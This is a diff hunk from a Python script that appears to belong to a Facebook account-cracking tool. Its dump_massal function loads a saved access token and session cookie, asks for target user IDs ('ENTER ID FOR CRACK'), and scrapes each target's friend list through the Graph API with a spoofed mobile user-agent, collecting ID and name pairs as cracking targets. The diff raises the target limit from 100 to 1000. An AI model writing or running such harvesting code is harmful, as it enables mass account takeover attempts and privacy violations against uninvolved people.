@@ -991,73 +991,61 @@ def File2():
 				setting()
 			except IOError:
 				exit("\x1b[1;32m[!] FILE  %s NOT FOUND"%(fileX))
-def dump_massal():
-
+def dump_massal():    
 	try:
-
 		token = open('.token.txt','r').read()
-
 		cok = open('.cok.txt','r').read()
-
 	except IOError:
-
-		exit()
-
+	    exit()
 	try:
-
-		jum = int(input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mHOW MOCH ID FOR CRACK ? > \x1b[1;93m  '))
-
+		kumpulkan = int(input(f'\n\x1b[30m CHAN ID : '))
 	except ValueError:
-
-		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mENTER ID FOR CKRACK !')
-
-		exit()
-
-	if jum<1 or jum>100:
-
-		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mGagal Dump ID ')
-
-		exit()
-
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
 	ses=requests.Session()
-
-	yz = 0
-
-	for met in range(jum):
-
-		yz+=1
-
-		kl = input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mENTER ID FOR CRACK '+str(yz)+' > \x1b[1;93m')
-
-		uid.append(kl)
-
-	for userr in uid:
-
-		try:
-
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-
-			for mi in col['friends']['data']:
-
-				try:
-
-					iso = (mi['id']+'|'+mi['name'])
-
-					if iso in id:pass
-
-					else:id.append(iso)
-
-				except:continue
-
-		except (KeyError,IOError):
-
-			pass
-
-		except requests.exceptions.ConnectionError:
-
-			print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
-
-			exit()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'\n\x1b[34m [•] Enter ID  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {'user-agent': 'Mozilla/5.0 (Android; Android 4.4.1; Nokia 3410 Build/IMM76D) AppleWebKit/600.20 (KHTML, like Gecko)  Chrome/49.0.3035.398 Mobile Safari/601.5'
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      print(" Total  : "+str(len(id))) 
+	      setting()
+	except requests.exceptions.ConnectionError:
+	    exit()
+	except (KeyError,IOError):
+		exit()
 
 	try:
 
